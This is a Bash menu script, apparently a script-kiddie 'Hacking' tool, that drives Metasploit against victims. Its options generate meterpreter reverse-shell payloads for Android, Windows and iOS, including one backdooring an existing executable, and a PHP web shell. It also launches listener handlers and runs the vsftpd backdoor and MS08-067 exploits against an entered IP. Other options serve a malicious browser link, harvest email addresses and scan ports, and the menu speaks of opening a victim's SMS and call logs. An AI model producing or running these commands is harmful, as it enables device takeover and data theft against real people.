clear

#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install
echo -e "$green "
figlet  -f big "           Hacking "
echo -e "$blue"
echo -e
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
echo ""
echo -e $yellow	"Welcome" 
sleep 0.4
clear
echo -e "Welcom In"
sleep 0.4
clear
echo -e "Welcom In Hacking" 
sleep 0.4
clear
echo -e "Welcome In Hacking 2019"
sleep 0.4
clear
echo -e "Welcome In Hacking 2019 U"
sleep 0.4
clear
echo -e "Welcome In Hacking 2019 U Can"
sleep 0.4
clear
echo -e "Welcome In Hacking 2019 U Can Injoy"
sleep 0.4
clear
echo -e "Welcome In Hacking 2019 U Can Injoy With"
sleep 0.4
clear
echo -e "Welcome In Hacking 2019 U Can Injoy With Me"
echo ""
echo -e $p     "Copy"
sleep 0.4
clear
echo -e "Copy Write"
sleep 0.4
clear
echo -e "Copy Write By" 
sleep 0.4
clear
echo -e "Copy Write By Saeed"
sleep 0.4
clear
echo -e "Copy Write By Saeed Ahmeed"
echo ""
echo -e $p "My Telegram"
sleep 0.3
clear
echo -e "My Telegram :" 
sleep 0.3
clear
echo -e "My Telegram : @Zoalktoom"
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
#echo -e "$green"
echo -e "$cyan"
echo -e "|---{$yellow my ip$cyan }---| "
       curl ifconfig.me
echo -e "$blue"
ifconfig wlan0 | grep -o 192..........
#echo -e "$green "
#date
echo -e "$yellow"
sleep 1
#echo ''
echo -e "$red                  [77] update          exit [00]"
echo -e "$cyan"
echo "            [1]payload android "
echo "            [2]payload windows "
echo "            [3]Android penetration msf "
echo "            [4]windows penetration msf "
echo "            [5]Breakthrough via Port (21)"
echo "            [6]Breakthrough via Port (445)"
echo "            [7]open (sms,calllog,....txt) The victim "
echo "            [8]Open the victim files that you downloaded"
echo "            [9]Breakthrough by malicious link "
echo "            [10]error metasploit "
echo "            [11]Download msf (5.0.0)"
echo "            [12]payload iphone "
echo "            [13]iphone penetration msf "
echo "            [14]Create SHELL "
echo "            [15]Control the site by shell "
echo "            [16]Search Engine Domain Email Address Collector"
echo "            [17]DNS Record Scanner and Enumerator"
echo "            [18]TCP Port Scanner"
echo "            [19]TCP SYN Port Scanner "
echo "            [20]HTTP Version Detection"
echo -e "$green"
read -p "     number------->  " Zoal
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
if [ $Zoal -eq 1 ]
then
echo -e $yellow " please insert LHOST :>"
read -p "                       LHOST----->" lhost
echo -e $yellow " please insert port :>"
read -p "                       LPORT----->" lport
echo -e $yellow " please insert Name payload :>"
read -p "                       Name----->" name
echo -e $yellow " please insert path :>"
read -p "                       Path----->" path
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport  -o $path/$name.apk
echo ""
echo -e $cyan " Done  Now U Can find a Payload in your files"
echo ""
read -p "Press Enter to continue..."
bash hacking.sh
fi
if [ $Zoal -eq 2 ]
then
echo -e $green " please insert LHOST :>"
read -p "                      LHOST----->" lhost
echo -e $green " please insert port :>"
read -p "                      LPORT----->" lport
echo -e $green " please insert Name payload :>"
read -p "                      Name----->" name
echo -e $green " please insert path :>"
read -p "                      Path----->" path
msfvenom -a x86 --platform windows -x $name.exe -k -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport  -o $path/$name.exe
echo ""
echo -e $cyan " Done  Now U Can find a Payload in your files"
read -p "Press Enter to continue..."
bash hacking.sh
fi
if [ $Zoal -eq 3 ]
then
echo -e $blue "Please Insert LHOST :>"
read -p "                    LHOST----->" host
echo -e $blue "Please Insert PORT :>"
read -p "                    LPORT----->" lport
msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
fi
if [ $Zoal -eq 4 ]
then
echo -e $white "Please Insert LHOST :>"
read -p "                     LHOST----->" host
echo -e $white "Please Insert PORT :>"
read -p "                     LPORT----->" lport
msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
fi 
if [ $Zoal -eq 5 ]
then
echo -e "$cyan"
read -p "                  ip----->" ip
msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor' -x 'set payload cmd/unix/interact' -x 'set RHOST $ip' -x 'set RPORT 21' -x 'exploit'
fi
if [ $Zoal -eq 6 ]
then
msfconsole -x 'use windows/smb/ms08_067_netapi' -x 'set payload windows/meterpreter/bind_tcp' -x 'set RHOST $ip' -x 'set RPORT 445' -x'exploit'
fi
if [ $Zoal -eq 7 ]
then
echo -e "$red"
echo ""
cd $HOME/ && ls
echo ""
read -p "name.txt ------> " n
fi
cd $HOME/Hack-Devices
if [ $Zoal -eq 8 ]
then
echo -e "$red"
echo ""
cd $HOME/ && ls
echo ""
read -p "name photo ------> " n
echo -e "$green"
fi
cd $HOME/Hack-Devices
if [ $Zoal -eq 10 ]
then
echo -e "++++++++++++++++> please wait <++++++++++++++++"
cd .msf
chmod +x *
sh .error.sh
fi
if [ $Zoal -eq 11 ]
then
echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
git clone https://github.com/rapid7/metasploit-framework
bundle install
clear
echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
gem install crass -v '1.0.4' --source 'https://rubygems.org/'
cd metasploit-framework
bundle update nokogiri
echo -e "$g++++++++++>$p[end Download metasploit]$g<++++++++++++"
sleep 1
hacking.sh
fi
if [ $Zoal -eq 12 ]
then
echo -e $green " please insert LHOST :>"
read -p "                      LHOST----->" lhost
echo -e $green " please insert port :>"
read -p "                      LPORT----->" lport
echo -e $green " please insert Name payload :>"
read -p "                      Name----->" name
echo -e $green " please insert path :>"
read -p "                      Path----->" path
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.ipa
echo ""
echo -e $cyan " Done Now u can find a payload in your files"
read -p "Press Enter to continue..."
bash hacking.sh
fi
if [ $Zoal -eq 9 ]
then
echo -e $green "Please Insert SRVHOST :>"
read -p "                     LHOST----->" host
echo -e $green "Please Insert SRVPORT :>"
read -p "                     LPORT----->" lport
msfconsole -x 'use exploit/multi/browser/java_signed_applet' -x 'set SRVHOST '$host -x 'set SRVPORT '$port -x 'set URLPATH /exploit ' -x 'set AAPLETNAME google_unix4 ' -x 'exploit'
fi
if [ $Zoal -eq 13 ]
then
echo -e $green "Please Insert LHOST :>"
read -p "                     LHOST------>" host
echo -e $green "Please Insert PORT :>"
read -p "                     LPORT----->" port
msfconsole -x 'use exploit/multi/handler' -x 'set payload iphone/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'run'
fi 
if [ $Zoal -eq 14 ]
then
echo -e $blue "Please Insert LHOST :>"
read -p "                    LHOST----->" lhost
echo -e $blue "Please Insert PORT :>"
read -p "                    LPORT----->" lport
msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > /sdcard/shell.php
echo ""
echo -e $blue " Done u can find a shell in your files"
read -p "Press Enter to continue..."
bash hacking.sh
fi
if [ $Zoal -eq 15 ]
then
echo -e $green "Please Insert LHOST :>"
read -p "                     LHOST------>" host
echo -e $green "Please Insert PORT :>"
read -p "                     LPORT----->" port
msfconsole -x 'use exploit/multi/handler' -x 'set PAYLOAD php/meterpreter_reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
fi
if [ $Zoal -eq 16 ]
then
echo -e $green "Please Insert DOMAIN :>"
read -p "                     DOMAIN------>" domain
msfconsole -x 'use auxiliary/gather/search_email_collector' -x 'set DOMAIN '$domain -x 'exploit'
fi
if [ $Zoal -eq 17 ]
then
echo -e $green "Please Insert DOMAIN :>"
read -p "                     DOMAIN------>" domain
msfconsole -x 'use auxiliary/gather/enum_dns' -x 'sed DOMAIN '$domain -x 'run'
fi
if [ $Zoal -eq 18 ]
then
echo -e $green "Please Insert RHOSTS :>"
read -p "                     RHOST------>" host
msfconsole -x 'use auxiliary/scanner/portscan/tcp' -x 'set RHOSTS '$host -x 'exploit'
fi
if [ $Zoal -eq 19 ]
then
echo -e $green "Please Insert RHOSTS :>"
read -p "                     RHOST------>" host
msfconsole -x 'use auxiliary/scanner/portscan/syn' -x 'set RHOSTS '$host -x 'exploit'
fi
if [ $Zoal -eq 20 ]
then
echo -e $green "Please Insert RHOSTS :>"
read -p "                     RHOST------>" host
msfconsole -x 'use auxiliary/scanner/http/http_version' -x 'set RHOSTS '$host -x 'run'
fi
if [ $Zoal -eq 77 ]
then
cd $HOME
rm -rf Hack-Devices
git clone https://github.com/saeedo201/Hack-Devices
echo -e $cayn #---------->Hi New Update<----------#
sleep 2
cd $HOME
fi
if [ $Zoal = 00 ]
then
figlet "God Bey"
fi
